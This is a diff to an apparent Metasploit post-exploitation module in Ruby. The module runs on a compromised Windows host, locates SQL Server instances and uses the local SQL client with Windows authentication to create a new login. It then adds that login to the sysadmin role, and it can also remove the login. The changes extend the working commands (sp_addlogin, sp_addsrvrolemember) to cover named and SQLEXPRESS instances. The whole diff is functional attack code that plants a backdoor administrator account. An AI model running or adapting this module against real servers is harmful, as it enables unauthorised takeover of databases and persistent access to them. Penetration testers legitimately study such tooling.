@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Post
 	end
 	
 	# TODO
-	# - finalize instance option so it is used when adding login	
+	# - Test all options on all SQL Server 2k to 2k12	
 
 	def run
 			
@@ -57,8 +57,8 @@ class Metasploit3 < Msf::Post
 			
 			# Check if a SQL Server service is running
 			print_status("Checking for SQL Server...") if verbose == "true"
-			sqlinstance = check_for_sqlserver(instance)			
-			if sqlinstance != 0
+			service_instance = check_for_sqlserver(instance)			
+			if service_instance != 0
 								
 				# Identify available native SQL client
 				print_status("Checking for native client...") if verbose == "true"
@@ -70,17 +70,17 @@ class Metasploit3 < Msf::Post
 											
 						# Add new login
 						print_status("Attempting to add new login #{datastore['DB_USERNAME']}...") if verbose == "true"
-						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,verbose)
+						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
 						if add_login_status == 1
 							
 							# Add login to sysadmin fixed server role
 							print_status("Attempting to make #{datastore['DB_USERNAME']} login a sysadmin...") if verbose == "true"
-							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,verbose)				
+							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)				
 						end
 					else
 						
 						# Remove login
-						remove_sql_login(sql_client,datastore['DB_USERNAME'],verbose)
+						remove_sql_login(sql_client,datastore['DB_USERNAME'],instance,service_instance,verbose)
 					end
 					
 				end
@@ -109,7 +109,7 @@ class Metasploit3 < Msf::Post
 					# Display results
 					service_instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
 					print_good("SQL Server service found: #{service_instance}")				
-					return 1
+					return service_instance
 				end
 			else
 			
@@ -118,7 +118,7 @@ class Metasploit3 < Msf::Post
 				
 					# Display user defined instance				
 					print_good("SQL Server instance found: #{instance}")				
-					return 1
+					return instance
 				end
 			end
 		end		
@@ -170,18 +170,34 @@ class Metasploit3 < Msf::Post
 	end
 
 	## Method for adding a login
-	def add_sql_login(sqlclient,dbuser,dbpass,instance,verbose)
-		
+	def add_sql_login(sqlclient,dbuser,dbpass,instance,service_instance,verbose)
+					
+		# Setup command format to accomidate command inconsistencies
+		if instance == ""			
+			# Check default instance name
+			if service_instance == "SQLEXPRESS" then			
+				# Set command here			
+				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""			
+			else 							
+				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""						
+			end
+		else		
+			# Set command here
+			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""				
+		end
+
 		# Display debugging information
 		print_status("Settings:") if verbose == "true" 
 		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
+		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
+		print_status(" o User defined instance: #{instance}") if verbose == "true" 
 		print_status(" o User: #{dbuser}") if verbose == "true" 
 		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
 		print_status("Command:") if verbose == "true" 
-		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\"") if verbose == "true" 
+		print_status("#{sqlcommand}") if verbose == "true" 
 		
 		# Get Data
-		add_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\"")
+		add_login_result = run_cmd("#{sqlcommand}")
 		
 		# Parse Data 
 		add_login_array = add_login_result.split("\n")
@@ -194,35 +210,49 @@ class Metasploit3 < Msf::Post
 			end
 		end	
 		
-		if check == 0	
-		
+		# Display reults
+		if check == 0			
 			print_good("Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")	
-			return 1
-			
-		else 
-		
+			return 1			
+		else 		
 			# Fail
 			print_error("Unabled to add login #{dbuser}")
 			print_error("Database Error:\n #{add_login_result}")
-			return 0
-			
+			return 0			
 		end
 
 	end
 	
-	# Method for adding a login to sysadmin role
-	def add_sysadmin(sqlclient,dbuser,dbpass,instance,verbose)
+	
+	## Method for adding a login to sysadmin role
+	def add_sysadmin(sqlclient,dbuser,dbpass,instance,service_instance,verbose)
+	
+		# Setup command format to accomidate command inconsistencies
+		if instance == ""			
+			# Check default instance name
+			if service_instance == "SQLEXPRESS" then			
+				# Set command here for SQLEXPRESS							
+				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
+			else 											
+				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
+			end
+		else		
+			# Set command here			
+			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""	
+		end
 	
 		# Display debugging information
 		print_status("Settings:") if verbose == "true" 
 		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
+		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
+		print_status(" o User defined instance: #{instance}") if verbose == "true" 
 		print_status(" o User: #{dbuser}") if verbose == "true" 
-		print_status(" o Password:  #{dbpass}") if verbose == "true"  
-		print_status("Command:")  if verbose == "true" 
-		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"") if verbose == "true" 
+		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
+		print_status("Command:") if verbose == "true" 
+		print_status("#{sqlcommand}") if verbose == "true" 
 		
 		# Get Data
-		add_sysadmin_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"")
+		add_sysadmin_result = run_cmd("#{sqlcommand}")
 		
 		# Parse Data 
 		add_sysadmin_array = add_sysadmin_result.split("\n")
@@ -249,17 +279,33 @@ class Metasploit3 < Msf::Post
 
 	
 	## Method for removing login
-	def remove_sql_login(sqlclient,dbuser,verbose)
+	def remove_sql_login(sqlclient,dbuser,instance,service_instance,verbose)
+	
+		# Setup command format to accomidate command inconsistencies
+		if instance == ""			
+			# Check default instance name
+			if service_instance == "SQLEXPRESS" then			
+				# Set command here for SQLEXPRESS											
+				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS  -Q \"sp_droplogin '#{dbuser}'\""				
+			else 															
+				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\""				
+			end
+		else		
+			# Set command here						
+			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_droplogin '#{dbuser}'\""
+		end
 		
 		# Display debugging information
 		print_status("Settings:") if verbose == "true" 
 		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
-		print_status(" o User: #{dbuser}") if verbose == "true" 			
+		print_status(" o User: #{dbuser}") if verbose == "true" 	
+		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
+		print_status(" o User defined instance: #{instance}") if verbose == "true" 		
 		print_status("Command:") if verbose == "true" 
-		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"") if verbose == "true" 
+		print_status("#{sqlcommand}") if verbose == "true" 
 		
 		# Get Data
-		remove_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"")
+		remove_login_result = run_cmd("#{sqlcommand}")
 		
 		# Parse Data 
 		remove_login_array = remove_login_result.split("\n")
